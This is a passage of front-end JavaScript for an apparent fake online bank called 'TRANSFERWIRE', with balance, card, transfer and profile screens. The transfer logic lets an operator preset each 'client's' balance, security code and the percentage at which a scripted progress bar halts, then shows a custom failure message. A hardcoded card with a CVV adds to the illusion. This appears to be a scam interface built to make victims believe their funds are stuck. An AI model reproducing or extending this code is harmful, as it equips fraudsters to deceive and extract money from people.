                        <span>${t('transferDetails')}</span>
                    </div>

                    <form id="transfer-form">
                        <div class="form-group"><input type="text" class="form-input" id="input-iban" placeholder="${t('ibanPh')}" required></div>
                        <div class="form-group"><input type="text" class="form-input" id="input-swift" placeholder="${t('swiftPh')}" required></div>
                        <div class="form-group"><input type="text" class="form-input" id="input-bank" placeholder="${t('bankPh')}" required></div>
                        <div class="form-group"><input type="text" class="form-input" id="input-name" placeholder="${t('beneficiaryPh')}" required></div>
                        <div class="form-group"><input type="text" class="form-input" id="input-title" placeholder="${t('reasonPh')}" required></div>
                    </form>

                    <div class="warning-box">
                        <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
                        <div class="warning-text">${t('processingWarning')}</div>
                    </div>

                    <button class="submit-btn" onclick="submitTransferForm()">
                        ${t('nextBtn')}
                        <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                    </button>
                </div>

                <!-- VÉRIFICATION -->
                <div id="screen-verification" class="screen">
                    <div class="summary-card">
                        <div class="summary-header">
                            <svg viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                            <span>${t('transferSummary')}</span>
                        </div>
                        <div class="summary-list">
                            <div class="summary-item"><span>${t('transferAmountLabel')}</span><span class="summary-value">${balanceFormatted}</span></div>
                            <div class="summary-item"><span>${t('ibanLabel')}</span><span class="summary-value-block" id="summary-iban">${t('ibanLabelLine2')} </span></div>
                            <div class="summary-item"><span>${t('swiftLabel')}</span><span class="summary-value" id="summary-swift"></span></div>
                            <div class="summary-item"><span>${t('bankLabel')}</span><span class="summary-value" id="summary-bank"></span></div>
                            <div class="summary-item"><span>${t('beneficiaryLabel')}</span><span class="summary-value" id="summary-name"></span></div>
                            <div class="summary-item"><span>${t('reasonLabel')}</span><span class="summary-value" id="summary-title"></span></div>
                        </div>
                    </div>

                    <div class="verification-section">
                        <div class="verification-header">
                            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.5 1.1 2.5 2.5S13.4 12 12 12s-2.5-1.1-2.5-2.5S10.6 7 12 7zm0 10c-2.03 0-3.82-1.14-4.76-2.83.03-1.58 3.17-2.45 4.76-2.45 1.58 0 4.73.87 4.76 2.45C15.82 15.86 14.03 17 12 17z"/></svg>
                            <span>${t('identityVerification')}</span>
                        </div>
                        <div class="verification-desc">${t('verificationDesc')}</div>
                        <input type="text" class="verification-input" id="security-code" placeholder="${t('securityCodePh')}" required>
                        <button class="submit-btn" onclick="startProcessing()">
                            ${t('sendBtn')}
                            <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
                        </button>
                    </div>
                </div>

                <!-- TRAITEMENT -->
                <div id="screen-processing" class="screen">
                    <div class="info-card">
                        <h2>${t('wellDone')}</h2>
                        <p>${t('processingDesc')}</p>
                        <div class="divider"></div>
                        <div class="info-details">
                            <div><span class="lbl">${t('beneficiaryLabel')}</span> ${client.firstName} ${client.lastName}</div>
                            <div><span class="lbl">${t('bankLabel')}</span> ${client.bankName || 'Bnp paribas'}</div>
                            <div><span class="lbl">${t('ibanLabel')}</span> <span id="processing-iban"></span></div>
                            <div><span class="lbl">${t('amountToReceive')}</span> ${balanceFormatted}</div>
                        </div>
                    </div>
                    <div class="progress-section">
                        <div class="progress-text">${t('processingText')}</div>
                        <div class="progress-bar-container">
                            <div class="progress-fill" id="progress-bar">
                                <span class="progress-percentage" id="progress-text">0%</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- CARTE -->
                <div id="screen-card" class="screen">
                    <div class="info-banner info-banner-blue" id="card-banner">
                        <div class="banner-text">${t('cardWelcome')}</div>
                        <div class="banner-close" onclick="document.getElementById('card-banner').style.display='none'">
                            <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
                        </div>
                    </div>
                    <div class="credit-card">
                        <div>
                            <div class="card-brand">TRANSFERWIRE</div>
                            <div class="card-number">4987 **** **** 3327</div>
                            <div class="card-holder">${client.firstName} ${client.lastName}</div>
                        </div>
                        <div class="card-footer">
                            <div>
                                <div class="card-expiry">${t('validUntil')} 05/2029</div>
                                <div class="card-cvv">CVV : 843</div>
                            </div>
                            <div class="visa-logo">VISA</div>
                        </div>
                    </div>
                    <div class="card-actions">
                        <button class="btn btn-green" onclick="alert('${t('activateCardBtn')}')">${t('activateCardBtn')}</button>
                        <button class="btn btn-red" onclick="alert('${t('blockCardBtn')}')">${t('blockCardBtn')}</button>
                    </div>
                    <div class="card-transactions-title">${t('cardTransactions')}</div>
                    <div class="spinner-container"><div class="spinner"></div></div>
                </div>

                <!-- PROFIL -->
                <div id="screen-profile" class="screen">
                    <div class="info-banner info-banner-yellow" id="profile-banner">
                        <div class="banner-text">${t('profileBanner')}</div>
                        <div class="banner-close" onclick="document.getElementById('profile-banner').style.display='none'">
                            <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
                        </div>
                    </div>
                    <div class="profile-section">
                        <div class="profile-header">
                            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                            <span>${t('personalData')}</span>
                        </div>
                        <div class="profile-list">
                            <div class="profile-item"><span class="profile-label">${t('accountOwner')}</span><span class="profile-value">${client.firstName} ${client.lastName}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('emailLabel')}</span><span class="profile-value">${client.email}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('phoneLabel')}</span><span class="profile-value">${client.phone}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('countryLabel')}</span><span class="profile-value">${client.country}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('addressLabel')}</span><span class="profile-value">${client.address}</span></div>
                        </div>
                    </div>
                    <div class="profile-section">
                        <div class="profile-header">
                            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z"/></svg>
                            <span>${t('accountAndTransfer')}</span>
                        </div>
                        <div class="profile-list">
                            <div class="profile-item"><span class="profile-label">${t('balanceProfile')}</span><span class="profile-value">${balanceFormatted}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('accountType')}</span><span class="profile-value">${t('accountTypeValue')}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('accountStatus')}</span><span class="profile-value status-active"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> ${t('statusActive')}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('supportedTransfer')}</span><span class="profile-value">${t('transferTypeValue')}</span></div>
                            <div class="profile-item"><span class="profile-label">${t('beneficiaryIban')}</span><span class="profile-value iban-link">${client.address || 'N/A'}</span></div>
                        </div>
                    </div>
                    <button class="logout-btn" onclick="DB.clearActiveClient(); router();">
                        <svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
                        ${t('logoutBtn')}
                    </button>
                </div>
            </div>

            <nav class="bottom-nav">
                <div class="nav-item active" id="nav-dashboard" onclick="navigateTo('screen-dashboard')">
                    <div class="active-indicator"></div>
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.31-8.86c-1.77-.45-2.34-.94-2.34-1.67 0-.84.79-1.43 2.1-1.43 1.38 0 1.9.66 1.94 1.64h1.71c-.05-1.34-.87-2.57-2.49-2.97V5H10.9v1.69c-1.51.32-2.72 1.3-2.72 2.81 0 1.79 1.49 2.69 3.66 3.21 1.95.46 2.34 1.15 2.34 1.87 0 .53-.39 1.39-2.1 1.39-1.6 0-2.23-.72-2.32-1.64H8.04c.1 1.7 1.36 2.66 2.86 2.97V19h2.34v-1.67c1.52-.29 2.72-1.16 2.73-2.77-.01-2.2-1.9-2.96-3.66-3.42z"/></svg>
                    <span>${t('navBalance')}</span>
                </div>
                <div class="nav-item" id="nav-card" onclick="navigateTo('screen-card')">
                    <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                    <span>${t('navCard')}</span>
                </div>
                <div class="nav-item" id="nav-transfer" onclick="navigateTo('screen-transfer')">
                    <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
                    <span>${t('navTransfer')}</span>
                </div>
                <div class="nav-item" id="nav-profile" onclick="navigateTo('screen-profile')">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                    <div class="notification-dot"></div>
                    <span>${t('navAccount')}</span>
                </div>
            </nav>
        </div>
    `;
}

// Rendu dynamique des transactions avec traduction
function renderTransactions(transactions) {
    if (!transactions || transactions.length === 0) {
        return `<p style="color: #888; font-size: 14px; text-align: center; padding: 20px 0;">${t('noTransactions')}</p>`;
    }
    return transactions.map(tx => {
        const title = tx.type === 'out' ? t('txTransferSent') : t('txTransferReceived');
        return `
            <div class="transaction-item">
                <div class="tx-icon ${tx.type === 'in' ? 'icon-green' : 'icon-red'}">
                    <svg viewBox="0 0 24 24">${tx.type === 'in' ? '<path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zm-4.5-9L2 6v2h19V6l-9.5-5z"/>' : '<path d="M4 12l1.41 1.41L11 7.83V20h2V7.83l5.58 5.59L20 12l-8-8-8 8z"/>'}</svg>
                </div>
                <div class="tx-details">
                    <div class="tx-title">${title}</div>
                    <div class="tx-subtitle">${tx.subtitle}</div>
                </div>
                <div class="tx-amount">
                    <div class="${tx.type === 'in' ? 'amount-pos' : 'amount-neg'}">${tx.type === 'in' ? '+' : '-'}${tx.amount}</div>
                    <div class="tx-date">${tx.date}</div>
                </div>
            </div>
        `;
    }).join('');
}

// ==========================================
// LOGIQUE DE NAVIGATION
// ==========================================
function navigateTo(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(screenId).classList.add('active');
    
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
        const indicator = item.querySelector('.active-indicator');
        if(indicator) indicator.remove();
    });

    const navMap = { 'screen-dashboard': 'nav-dashboard', 'screen-card': 'nav-card', 'screen-profile': 'nav-profile' };
    let navId = navMap[screenId];
    if (screenId === 'screen-transfer' || screenId === 'screen-verification' || screenId === 'screen-processing') navId = 'nav-transfer';
    
    if (navId) {
        document.getElementById(navId).classList.add('active');
        document.getElementById(navId).insertAdjacentHTML('afterbegin', '<div class="active-indicator"></div>');
    }
    
    document.querySelector('.screens-container').scrollTop = 0;
}

// ==========================================
// LOGIQUE DE TRANSFERT
// ==========================================
function submitTransferForm() {
    const iban = document.getElementById('input-iban').value.trim();
    const swift = document.getElementById('input-swift').value.trim();
    const bank = document.getElementById('input-bank').value.trim();
    const name = document.getElementById('input-name').value.trim();
    const title = document.getElementById('input-title').value.trim();

    if (!iban || !swift || !bank || !name || !title) {
        alert("Veuillez remplir tous les champs.");
        return;
    }

    document.getElementById('summary-iban').innerText = t('ibanLabelLine2') + ' ' + iban;
    document.getElementById('summary-swift').innerText = swift;
    document.getElementById('summary-bank').innerText = bank;
    document.getElementById('summary-name').innerText = name;
    document.getElementById('summary-title').innerText = title;

    navigateTo('screen-verification');
}

function startProcessing() {
    const code = document.getElementById('security-code').value.trim();
    if (!code) { alert("Veuillez saisir le code de sécurité."); return; }
    
    if (code !== currentClient.activationCode) {
        alert("Code de sécurité incorrect.");
        return;
    }

    const ibanInput = document.getElementById('input-iban').value;
    document.getElementById('processing-iban').innerText = ibanInput;

    navigateTo('screen-processing');
    
    const progressBar = document.getElementById('progress-bar');
    const progressText = document.getElementById('progress-text');
    let progress = currentClient.startPercent || 0;
    const stopAt = currentClient.stopPercent || 100;

    progressBar.style.width = progress + '%';
    progressText.innerText = progress + '%';

    clearInterval(progressInterval);
    progressInterval = setInterval(() => {
        if (progress >= stopAt) {
            clearInterval(progressInterval);
            if (stopAt >= 100) {
                setTimeout(() => showResultModal(true), 500);
            } else {
                setTimeout(() => showResultModal(false), 500);
            }
            return;
        }
        progress += Math.floor(Math.random() * 3) + 1;
        if (progress > stopAt) progress = stopAt;
        
        progressBar.style.width = progress + '%';
        progressText.innerText = progress + '%';
    }, 150);
}

function showResultModal(isSuccess) {
    const now = new Date();
    const dateStr = now.toLocaleDateString(currentLang === 'fr' ? 'fr-FR' : currentLang === 'es' ? 'es-ES' : currentLang === 'it' ? 'it-IT' : currentLang === 'de' ? 'de-DE' : 'pl-PL') + ' ' + now.toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'});
    const currency = currentClient.currency || '€';
    const balanceFormatted = formatAmount(currentClient.balance, currency);
    
    const iban = document.getElementById('input-iban').value;
    const swift = document.getElementById('input-swift').value;
    const bank = document.getElementById('input-bank').value;
    const name = document.getElementById('input-name').value;
    const reason = document.getElementById('input-title').value;

    const modalHeader = document.getElementById('modal-header');
    const modalIconCircle = document.getElementById('modal-icon-circle');
    const modalIconSvg = document.getElementById('modal-icon-svg');
    const modalTitle = document.getElementById('modal-title');
    const modalInfoIcon = document.getElementById('modal-info-icon');

    if (isSuccess) {
        modalHeader.className = 'modal-header success';
        modalIconCircle.className = 'check-icon-circle success';
        modalIconSvg.innerHTML = '<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>';
        modalTitle.className = 'modal-title success';
        modalTitle.innerText = t('modalSuccess').replace('{amount}', balanceFormatted);
        modalInfoIcon.innerHTML = '<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>';
        modalInfoIcon.style.fill = '#333';
    } else {
        modalHeader.className = 'modal-header failure';
        modalIconCircle.className = 'check-icon-circle failure';
        modalIconSvg.innerHTML = '<path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>';
        modalTitle.className = 'modal-title failure';
        modalTitle.innerText = t('modalFailure');
        modalInfoIcon.innerHTML = '<path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>';
        modalInfoIcon.style.fill = '#e53935';
    }

    document.getElementById('modal-details').innerHTML = `
        <div><span class="lbl">${t('beneficiaryLabel')}</span> ${name}</div>
        <div><span class="lbl">${t('bankLabel')}</span> ${bank}</div>
        <div><span class="lbl">${t('ibanLabel')}</span> ${iban}</div>
        <div><span class="lbl">${t('swiftLabel')}</span> ${swift}</div>
        <div><span class="lbl">${t('reasonLabel')}</span> ${reason}</div>
        <div><span class="lbl">${t('sendTime')}</span> ${dateStr}</div>
    `;
    
    const messageText = currentClient.message ? currentClient.message : '...';
    document.getElementById('modal-message').innerText = messageText;
    
    document.getElementById('modal-close-btn').innerText = t('closeBtn');

    document.getElementById('result-modal').classList.add('active');
    
    window.currentTransferSuccess = isSuccess;
}

function closeResultModal() {
    document.getElementById('result-modal').classList.remove('active');
    
    const isSuccess = window.currentTransferSuccess;
    const currency = currentClient.currency || '€';
    
    if (isSuccess) {
        const transferAmount = currentClient.balance;
        currentClient.balance = 0;
        const formattedBalance = formatAmount(currentClient.balance, currency);
        document.getElementById('display-balance').innerText = formattedBalance;

        const now = new Date();
        const dateStr = now.toLocaleDateString('fr-FR') + ' ' + now.toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'});
        
        const newTx = {
            type: 'out',
            subtitle: document.getElementById('input-name').value || (currentClient.firstName + ' ' + currentClient.lastName),
            amount: formatAmount(transferAmount, currency),
            date: dateStr
        };
        currentClient.transactions = currentClient.transactions || [];
        currentClient.transactions.unshift(newTx);
    }

    const clients = DB.getClients();
    clients[currentClient.id] = currentClient;
    DB.saveClients(clients);

    document.getElementById('transaction-list').innerHTML = renderTransactions(currentClient.transactions);

    document.getElementById('transfer-form').reset();
    document.getElementById('security-code').value = '';

    navigateTo('screen-dashboard');
}

// ==========================================
// INITIALISATION
// ==========================================
window.addEventListener('load', router);
window.addEventListener('popstate', router);
